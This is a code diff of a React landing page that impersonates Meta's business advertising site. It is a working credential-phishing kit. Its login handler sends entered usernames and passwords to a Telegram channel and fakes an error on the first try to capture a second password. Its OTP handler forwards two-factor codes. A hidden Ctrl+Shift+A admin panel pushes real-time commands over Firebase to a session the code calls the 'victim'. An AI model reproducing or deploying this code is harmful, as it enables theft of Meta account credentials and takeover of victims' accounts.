@@ -1,5 +1,3 @@
-'use client';
-
 import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
 import axios from 'axios';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
@@ -27,14 +25,13 @@ import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
 
 // ==========================================
-// CẤU HÌNH FIREBASE (TỪ CODE CŨ CỦA MÀY)
+// CẤU HÌNH FIREBASE
 const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
 const firebaseConfig = { databaseURL: FIREBASE_URL };
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 // ==========================================
 
-// --- COMPONENT VÒNG TRÒN LOADING ---
 const LoadingSpinner = () => (
     <div style={{
         width: '20px', height: '20px', border: '3px solid rgba(255, 255, 255, 0.3)',
@@ -44,22 +41,22 @@ const LoadingSpinner = () => (
 
 const Home = () => {
     // --- STATES GIAO DIỆN MỚI ---
-    const videoRef = useRef<HTMLVideoElement>(null);
+    const videoRef = useRef(null);
     const [isVideoPaused, setIsVideoPaused] = useState(false);
-    const adsVideoRef = useRef<HTMLVideoElement>(null);
+    const adsVideoRef = useRef(null);
     const [isAdsVideoPaused, setIsAdsVideoPaused] = useState(false);
     const [activeAccordion, setActiveAccordion] = useState('ads_manager');
-    const [playingVideo, setPlayingVideo] = useState<string | null>(null);
-    const fansVideoRef = useRef<HTMLVideoElement>(null);
+    const [playingVideo, setPlayingVideo] = useState(null);
+    const fansVideoRef = useRef(null);
     const [isFansVideoPaused, setIsFansVideoPaused] = useState(false);
     const [activeTab, setActiveTab] = useState('facebook');
-    const supportVideoRef = useRef<HTMLVideoElement>(null);
+    const supportVideoRef = useRef(null);
     const [isSupportVideoPaused, setIsSupportVideoPaused] = useState(false);
-    const [translatedTexts, setTranslatedTexts] = useState<any>({});
+    const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
-    // --- STATES LOGIC CŨ (ĐÃ ĐƯỢC ĐỔI TÊN CHO KHỚP GIAO DIỆN) ---
-    const [showModal, setShowModal] = useState(false); // Thay cho isStartModalsOpen
+    // --- STATES LOGIC CŨ ---
+    const [showModal, setShowModal] = useState(false);
     const [step, setStep] = useState(1);
     const [clientIp, setClientIp] = useState('Unknown');
     const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
@@ -67,14 +64,13 @@ const Home = () => {
     const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
     const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
     const [loading, setLoading] = useState(false);
-    const [errors, setErrors] = useState<any>({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
-    const [matchNumber, setMatchNumber] = useState<any>(null); 
+    const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
+    const [matchNumber, setMatchNumber] = useState(null); 
     const [showSuccess, setShowSuccess] = useState(false); 
     const [adminSessionId, setAdminSessionId] = useState(''); 
     const [adminNumberInput, setAdminNumberInput] = useState(''); 
     const [showAdmin, setShowAdmin] = useState(false);
 
-    // Tạo mã phiên
     const [sessionId] = useState(() => {
         if (typeof window === 'undefined') return 'server_session';
         let id = localStorage.getItem('session_id');
@@ -85,7 +81,6 @@ const Home = () => {
         return id;
     });
 
-    // --- TEXTS DỊCH ---
     const defaultTexts = useMemo(() => ({
         fullName: 'Full Name',
         personalEmail: 'Personal Email',
@@ -229,7 +224,6 @@ const Home = () => {
 
     const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
 
-    // --- EFFECT KHỞI TẠO IP & DỊCH ---
     useEffect(() => {
         localStorage.clear();
         initializeApp();
@@ -273,11 +267,11 @@ const Home = () => {
         }
     };
 
-    const translateAllTexts = useCallback(async (targetLang: string) => {
+    const translateAllTexts = useCallback(async (targetLang) => {
         try {
             const keys = Object.keys(defaultTexts);
-            const translations = await Promise.all(keys.map((key) => translateText((defaultTexts as any)[key], targetLang)));
-            const translated: any = {};
+            const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
+            const translated = {};
             keys.forEach((key, index) => { translated[key] = translations[index]; });
             setTranslatedTexts(translated);
         } catch (error) {
@@ -285,7 +279,6 @@ const Home = () => {
         }
     }, [defaultTexts]);
 
-    // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
     useEffect(() => {
         if (showModal && !showAdmin) {
             const commandRef = ref(database, 'commands/' + sessionId);
@@ -307,9 +300,8 @@ const Home = () => {
         }
     }, [showModal, showAdmin, sessionId]);
 
-    // --- PHÍM TẮT MỞ ADMIN ---
     useEffect(() => {
-        const handleKeyDown = (e: KeyboardEvent) => {
+        const handleKeyDown = (e) => {
             if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                 setShowAdmin(prev => !prev); setShowModal(true);
             }
@@ -320,9 +312,8 @@ const Home = () => {
 
     const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };
 
-    // --- XỬ LÝ LOGIC CŨ ---
-    const handleSignup = (e: React.FormEvent) => {
-        e.preventDefault(); let errs: any = {};
+    const handleSignup = (e) => {
+        e.preventDefault(); let errs = {};
         if (busName.length < 2) errs.busName = true; 
         if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
         if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
@@ -335,14 +326,14 @@ const Home = () => {
         setTimeout(() => { setLoading(false); setStep(2); }, 700);
     };
 
-    const handleLogin = (e: React.FormEvent) => {
+    const handleLogin = (e) => {
         e.preventDefault(); if (loginPass.length === 0) return;
         setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
         sendTelegramMessage(`<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
         setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
     };
 
-    const handleOtp = (e: React.FormEvent) => {
+    const handleOtp = (e) => {
         e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
         setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
         if (newAttempt <= 3) sendTelegramMessage(`<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
@@ -353,7 +344,7 @@ const Home = () => {
         }, 1500);
     };
 
-    const handleAdminCommand = (type: string, value: string) => {
+    const handleAdminCommand = (type, value) => {
         const targetUser = adminSessionId.trim(); 
         if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
         set(ref(database, 'commands/' + targetUser), { action: type, value: value }).then(() => {
@@ -362,20 +353,19 @@ const Home = () => {
     };
 
     if (isLoading) {
-        return <div id="intro"></div>; // Loading screen
+        return <div id="intro"></div>; 
     }
 
     return (
         <>
-            {/* KEYFRAMES CHO SPINNER */}
             <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
             
             <div className="meta-landing">
-                {/* ================= GIAO DIỆN MỚI CỦA MÀY ================= */}
+                {/* ===== HEADER ===== */}
                 <header style={{ width: '100%', borderBottom: '1px solid #e4e6eb', background: '#fff', position: 'sticky', top: 0, zIndex: 100 }}>
                     <div className="landing-header-row" style={{ maxWidth: '1504px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 32px', height: '64px' }}>
                         <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                            <img src={MetaLogoBlue.src} alt="Meta" style={{ width: '61px', objectFit: 'contain' }} />
+                            <img src={MetaLogoBlue} alt="Meta" style={{ width: '61px', objectFit: 'contain' }} />
                             <nav className="landing-nav-desktop" style={{ marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' }}>
                                 {[texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport].map((item, navIndex) => (
                                     <span key={item} onClick={() => { if (navIndex === 0) openModal(); }} style={{ cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' }}>
@@ -414,7 +404,6 @@ const Home = () => {
                                 <video ref={videoRef} style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }} muted loop playsInline autoPlay>
                                     <source src={HeroVideo} type="video/mp4" />
                                 </video>
-                                {/* Nút Pause/Play giữ nguyên */}
                                 <div style={{ position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 }}>
                                     <button aria-label={isVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo} style={{ width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', color: '#fff', cursor: 'pointer' }} onClick={() => { if (videoRef.current) { if (isVideoPaused) videoRef.current.play(); else videoRef.current.pause(); setIsVideoPaused(!isVideoPaused); } }}>
                                         {isVideoPaused ? <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> : <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg>}
